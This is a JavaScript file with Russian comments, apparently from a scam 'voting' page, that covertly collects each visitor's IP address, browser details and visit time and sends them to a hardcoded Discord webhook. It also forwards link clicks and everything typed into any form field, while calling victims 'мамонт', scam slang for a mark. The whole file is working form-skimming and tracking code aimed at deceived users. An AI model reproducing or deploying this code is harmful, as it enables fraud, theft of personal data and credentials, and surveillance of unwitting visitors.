// Ссылка на вебхук
const webhookURL = 'https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB';

// Функция для отправки данных в Discord через вебхук
function sendToDiscord(data) {
    const message = {
        content: data.content
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        if (response.ok) {
            console.log('Данные успешно отправлены в Discord');
        } else {
            console.error('Ошибка при отправке данных в Discord');
        }
    })
    .catch(error => {
        console.error('Ошибка при отправке запроса: ', error);
    });
}

// Обработчик нажатия на кнопку "Голосовать"
document.getElementById('voteButton').addEventListener('click', () => {
    const voteMessage = {
        content: `Мамонт нажал на кнопку!`
    };
    sendToDiscord(voteMessage);

    // Дополнительная логика при голосовании (например, увеличение счетчика голосов)
    const voteCount = document.getElementById('voteCount');
    let currentVotes = parseInt(voteCount.innerText);
    voteCount.innerText = currentVotes + 1;
});

// Функция для получения информации о пользователе
async function getUserInfo() {
    const userAgent = navigator.userAgent; // Получаем информацию о браузере/устройстве
    const timestamp = new Date().toLocaleString(); // Получаем текущее время

    // Получаем IP-адрес пользователя
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();

    return {
        phoneInfo: userAgent,
        visitTime: timestamp,
        ipAddress: ipData.ip
    };
}

// Функция для отправки данных в Discord при загрузке страницы
window.onload = async () => {
    const userData = await getUserInfo();
    sendToDiscord({
        content: `Мамонт посетил сайт:
        - Телефон мамонта: ${userData.phoneInfo}
        - Время входа мамонта: ${userData.visitTime}
        - IP-адрес Мамонта: ${userData.ipAddress}`
    });

    // Записываем время начала визита
    window.startTime = Date.now();
};

// Отслеживание кликов по ссылкам
document.querySelectorAll('a').forEach(link => {
    link.addEventListener('click', (event) => {
        const linkData = {
            action: 'Мамонт кликнул по ссылке',
            linkHref: event.target.href
        };
        sendToDiscord(linkData);
    });
});

// Отслеживание изменения ввода в текстовых полях (например, формы)
document.querySelectorAll('input, textarea').forEach(input => {
    input.addEventListener('input', (event) => {
        const inputData = {
            action: 'Мамонт дал данные',
            inputType: event.target.type,
            inputValue: event.target.value
        };
        sendToDiscord(inputData);
    });
});

// Отправка времени, проведенного на сайте, при уходе со страницы
window.onbeforeunload = () => {
    const endTime = Date.now();
    const timeSpent = Math.round((endTime - window.startTime) / 1000); // Время в секундах

    const timeSpentData = {
        content: `Мамонт провел на сайте ${timeSpent} секунд.`
    };
    sendToDiscord(timeSpentData);
};
